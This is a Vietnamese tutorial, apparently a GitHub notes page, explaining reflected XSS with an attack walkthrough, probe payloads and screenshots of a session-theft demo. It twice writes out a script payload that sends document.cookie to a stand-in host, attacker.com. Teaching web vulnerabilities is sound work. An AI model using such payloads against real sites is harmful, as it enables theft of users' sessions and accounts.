# Reflected XSS là gì?

Reflected XSS là hình thức tấn công được sử dụng nhiều nhất. Đây là nơi mã script độc hại đến từ HTTP request. Từ đó, hacker đánh cắp dữ liệu của người dùng, chiếm quyền truy cập và hoạt động của họ trên website thông qua việc chia sẻ URL chứa mã độc. Hình thức này thường nhắm đến ít nạn nhân.

### Reflected XSS được triển khai như thế nào?

<p align="center">
<img width="801" alt="Ảnh chụp Màn hình 2025-03-31 lúc 15 12 58" src="https://github.com/user-attachments/assets/61c733a1-d870-41ff-a224-2d47ffe572fd" />
</p>

Quá trình triển khai Reflected XSS cũng tương tự như các dạng tấn công cross-site scripting khác, đều gồm 4 bước chính sau:

- **Bước 1:** Kẻ tấn công tạo ra một URL có chứa mã độc, thường là JavaScript. 
**Ví dụ:**
```
http://example.com/search?query=<script>fetch('http://attacker.com?cookie='+document.cookie);</script>
```
> Hành động này cho phép kẻ tấn công lấy được cookie người dùng nếu họ còn giữ phiên đăng nhập và truy cập vào.

- **Bước 2:** Kẻ tấn công gửi liên kết độc hại qua email, mạng xã hội hoặc các phương tiện khác để lừa nạn nhân click vào.

- **Bước 3:** Khi nạn nhân nhấp vào liên kết, trình duyệt của họ gửi yêu cầu đến máy chủ với các tham số trong URL. Nếu ứng dụng web không kiểm tra và xử lý dữ liệu đầu vào một cách an toàn, nó sẽ phản hồi lại với mã độc đã được chèn.

- **Bước 4:** Mã độc được phản hồi từ máy chủ sẽ được thực thi trong môi trường trình duyệt của nạn nhân.

### Cách thức khai thác

**Payload:** ```<h1>XSS</h1>```, ```<script>alert('XSS')</script>```, ```<img src=x onerror=alert('XSS');>```...

**Hành động:** Đưa vào các tham số trong URL, form nhập liệu, kết quả từ tìm kiếm....

**Mong đợi:** Trang web trả về chức năng của payload( thẻ tiêu đề ```<h1>```, ```alert()```...).

**Mục tiêu:** Xác nhận trường input không được xử lý đầu vào, có thể khai thác.

<p align="center">
<img width="801" alt="Ảnh chụp Màn hình 2025-03-31 lúc 15 12 58" src="https://github.com/user-attachments/assets/cbb8b168-69a3-400b-a87f-a9a7a6789c7e" />
</p>

> Khi nhập payload **```<h1>XSS</h1>```** vào ô tìm kiếm, phản hồi từ trang web cho thấy thẻ tiêu đề **```<h1>```** đang được chèn trược tiếp vào URL và nội dung của HTML. Điều này cho thấy ứng dụng chèn nội dung từ URL vào trang web mà không có bất kỳ biện pháp lọc hoặc mã hóa nào.

**Khai thác đánh cắp phiên đăng nhập**

<p align="center">
<img width="801" alt="Ảnh chụp Màn hình 2025-03-31 lúc 15 12 58" src="https://github.com/user-attachments/assets/d1954303-aaba-4090-978a-6b41b16f14d3" />
</p>

> Chèn hành động **```fetch()```** để thực hiện đánh cắp cookie người dùng.
Payload: **```<script>fetch('http://attacker.com?cookie='+document.cookie);</script>```**. Sau đó gửi URL có chứa script cho nạn nhân và chờ đợi nạn nhân truy cập vào.

<p align="center">
<img width="801" alt="Ảnh chụp Màn hình 2025-03-31 lúc 15 12 58" src="https://github.com/user-attachments/assets/12917bfa-1a0d-489d-b958-debb02f708ee" />
</p>

> Khi nạn nhân click vào URL thì cookie sẽ được gửi trực tiếp đến attacker.